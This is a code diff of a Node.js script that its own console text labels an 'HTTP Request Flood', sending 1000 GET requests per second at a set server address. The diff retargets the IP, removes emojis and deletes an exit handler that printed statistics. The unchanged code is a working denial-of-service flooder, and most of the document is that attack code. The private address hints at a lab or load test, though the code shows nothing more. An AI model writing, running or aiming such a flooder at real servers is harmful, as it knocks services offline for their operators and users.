@@ -1,7 +1,7 @@
 const http = require('http');
 const https = require('https');
 
-const SERVER_URL = 'http://10.62.144.11:4000';
+const SERVER_URL = 'http://10.62.144.174:4000';
 const REQUESTS_PER_SECOND = 1000;
 
 // Performance-Optimierungen
@@ -18,7 +18,7 @@ let stats = {
     startTime: Date.now()
 };
 
-console.log('💀 HTTP Request Flood gestartet (1000 reqs/s)\n');
+console.log(' HTTP Request Flood gestartet (1000 reqs/s)\n');
 
 function sendRequest() {
     const protocol = SERVER_URL.startsWith('https') ? https : http;
@@ -27,7 +27,8 @@ function sendRequest() {
         method: 'GET',
         timeout: 1000
     }, (res) => {
-        res.on('data', () => {});
+        res.on('data', () => {
+        });
         res.on('end', () => {
             stats.success++;
             stats.total++;
@@ -58,7 +59,7 @@ function updateDisplay() {
     process.stdout.clearLine();
     process.stdout.cursorTo(0);
     process.stdout.write(
-        `📡 Erfolg: ${stats.success} | ` +
+        `Erfolg: ${stats.success} | ` +
         `Fehler: ${stats.failed} | ` +
         `Rate: ${reqsPerSec}/s `
     );
@@ -73,13 +74,3 @@ setInterval(() => {
 
 // Status-Update
 setInterval(updateDisplay, 500);
-
-// Cleanup
-process.on('SIGINT', () => {
-    console.log('\n\n📊 Finale Statistik:');
-    console.log(`- Erfolgreiche Requests: ${stats.success}`);
-    console.log(`- Fehlgeschlagene Requests: ${stats.failed}`);
-    console.log(`- Gesamte Requests: ${stats.total}`);
-    console.log(`- Erfolgsquote: ${(stats.success / stats.total * 100).toFixed(1)}%`);
-    process.exit();
-});
